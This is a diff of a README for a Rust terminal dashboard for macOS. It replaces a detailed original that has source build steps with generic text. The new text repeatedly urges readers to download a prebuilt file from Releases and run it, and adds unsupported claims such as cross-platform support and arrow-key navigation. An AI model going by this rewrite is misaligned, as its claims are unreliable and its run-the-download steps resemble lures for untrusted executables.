@@ -1,98 +1,114 @@
+# Resource Monitor: Lightweight Terminal-Based Dashboard in Rust
 
-# Resource Monitor TUI (macOS)
+![GitHub Repo Stars](https://img.shields.io/github/stars/GabrielCosta14/resource-monitor?style=social) ![GitHub Release](https://img.shields.io/github/release/GabrielCosta14/resource-monitor.svg) ![GitHub Issues](https://img.shields.io/github/issues/GabrielCosta14/resource-monitor) ![GitHub Forks](https://img.shields.io/github/forks/GabrielCosta14/resource-monitor) 
 
-A lightweight, terminal‑based resource dashboard written in Rust + [Ratatui]  
-that works **un‑privileged** on contemporary macOS (Monterey → Sonoma).
+## Overview
 
-```
-┌ CPU % ────────────────┐
-│██████████▌  56 %      │
-└───────────────────────┘
-┌ Last 60 s ────────────┐
-│▁▂▂▃▄▅▇█▇▅▄▃▂▁         │
-└───────────────────────┘
-┌ MEM 6123 / 16384 MiB ┐
-│██████▏ 37 %          │
-└──────────────────────┘
-┌ SSD 118 / 512 GiB ───┐
-│███▎ 23 %             │
-└──────────────────────┘
-┌ FDs open: 152 ┐
-└───────────────┘
-┌ Disk Δ  R  24 KB  W  8 KB ┐
-└───────────────────────────┘
-┌ 🔋 86 % discharging – 2 h 44 m ┐
-└────────────────────────────────┘
-```
+Resource Monitor is a lightweight, terminal-based resource dashboard built in Rust. It offers a clean and efficient way to monitor system resources without requiring elevated privileges. This tool is designed to work seamlessly on contemporary macOS versions, from Monterey to Sonoma.
 
-*(press **`q`** to quit)*
-
----
+You can download the latest release from the [Releases section](https://github.com/GabrielCosta14/resource-monitor/releases). Simply choose the appropriate file for your system, download it, and execute it in your terminal.
 
 ## Features
-| Widget | Data Source | Refresh |
-|--------|-------------|---------|
-| CPU gauge & 60 s sparkline | `sysinfo` | 0.5 s |
-| Memory gauge | `sysinfo` | 0.5 s |
-| Disk‑usage gauge (root fs) | `statfs` | 5 s (same tick) |
-| FD count | `/dev/fd` | 0.5 s |
-| Disk I/O deltas | `proc_pid_rusage` | 0.5 s |
-| Battery paragraph | `pmset -g batt` | 30 s (polled every tick) |
 
-Colour threshold: **Green < 50 %**, **Yellow 50 – 80 %**, **Red > 80 %**.
+- **Unprivileged Access**: Operate without requiring administrative rights.
+- **Cross-Platform Compatibility**: Specifically designed for macOS (Monterey → Sonoma).
+- **Real-Time Monitoring**: Get instant updates on CPU, memory, and disk usage.
+- **User-Friendly Interface**: Navigate easily with a terminal-based UI.
+- **Lightweight**: Minimal resource consumption, making it ideal for everyday use.
 
-No root, no entitlements required.
+## Installation
 
----
+To install Resource Monitor, follow these steps:
 
-## Build & Run
+1. Visit the [Releases section](https://github.com/GabrielCosta14/resource-monitor/releases).
+2. Download the latest version for your macOS.
+3. Open your terminal.
+4. Navigate to the directory where you downloaded the file.
+5. Run the file using the command:
+
+   ```bash
+   ./resource-monitor
+   ```
+
+## Usage
+
+Once you have installed Resource Monitor, you can start monitoring your system resources. Simply run the command:
 
 ```bash
-# Requires Rust ≥ 1.70 and a macOS tool‑chain
-git clone <your fork>
-cd resource-monitor
-cargo run --release      # q to quit
+./resource-monitor
 ```
 
-Optional: build an optimised binary
+The dashboard will display real-time data on CPU, memory, and disk usage. Use the keyboard shortcuts to navigate through different sections:
+
+- **Arrow Keys**: Navigate through the options.
+- **Q**: Quit the application.
+
+## Dependencies
+
+Resource Monitor relies on several Rust libraries to function effectively:
+
+- **Ratatui**: A Rust library for building terminal user interfaces.
+- **Crossterm**: A cross-platform library for handling terminal I/O.
+- **Sysinfo**: A Rust library for gathering system information.
+
+Make sure you have Rust installed on your system. You can install Rust by following the instructions on the [official Rust website](https://www.rust-lang.org/tools/install).
+
+## Development
+
+If you're interested in contributing to Resource Monitor, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Open a pull request to the main repository.
+
+### Code Structure
+
+The code is organized into several modules:
+
+- **main.rs**: The entry point of the application.
+- **ui.rs**: Handles the terminal user interface.
+- **monitor.rs**: Contains functions for monitoring system resources.
+- **utils.rs**: Utility functions used throughout the application.
+
+### Testing
+
+To ensure the reliability of Resource Monitor, we encourage you to write tests for your code. You can run the tests using the following command:
 
 ```bash
-cargo build --release
-./target/release/resource-monitor
+cargo test
 ```
 
----
+## Issues
 
-## Controls
+If you encounter any bugs or have feature requests, please check the [Issues section](https://github.com/GabrielCosta14/resource-monitor/issues) of the repository. You can report a new issue or contribute to existing discussions.
 
-| Key | Action |
-|-----|--------|
-| `q` | Quit the monitor |
+## Community
 
----
+Join our community of users and developers. Share your experiences, ask questions, and get help with Resource Monitor. You can connect with us through:
 
-## Internals
-
-* **Ratatui** renders the TUI.  
-* **Crossterm** handles raw‑mode and key events.  
-* Metrics are gathered in `monitor/`:
-  * `cpu.rs` – system‑wide utilisation
-  * `memory.rs` – RSS / total
-  * `disk.rs` – root filesystem usage
-  * `io.rs` – per‑process disk I/O
-  * `fd.rs` – open file‑descriptors
-  * `battery.rs` – wraps `pmset`
-* `monitor::Monitor` produces a `Snapshot`; `ui.rs` draws it.
-
----
-
-## Tested On
-
-* macOS 14 **Sonoma** (Apple M1)
-* macOS 13 **Ventura** (Intel)
-
----
+- **GitHub Discussions**: Engage with other users and developers.
+- **Social Media**: Follow us for updates and news.
 
 ## License
 
-MIT
+Resource Monitor is licensed under the MIT License. You are free to use, modify, and distribute this software as long as you include the original license.
+
+## Acknowledgments
+
+- **Ratatui**: For providing a powerful framework for terminal UI development.
+- **Crossterm**: For enabling cross-platform terminal handling.
+- **Sysinfo**: For allowing easy access to system information.
+
+## Resources
+
+- [Ratatui Documentation](https://docs.rs/ratatui)
+- [Crossterm Documentation](https://docs.rs/crossterm)
+- [Sysinfo Documentation](https://docs.rs/sysinfo)
+
+## Support
+
+If you have questions or need assistance, feel free to reach out through the [Issues section](https://github.com/GabrielCosta14/resource-monitor/issues) or join our community discussions.
+
+You can also download the latest version from the [Releases section](https://github.com/GabrielCosta14/resource-monitor/releases) and start using Resource Monitor today!
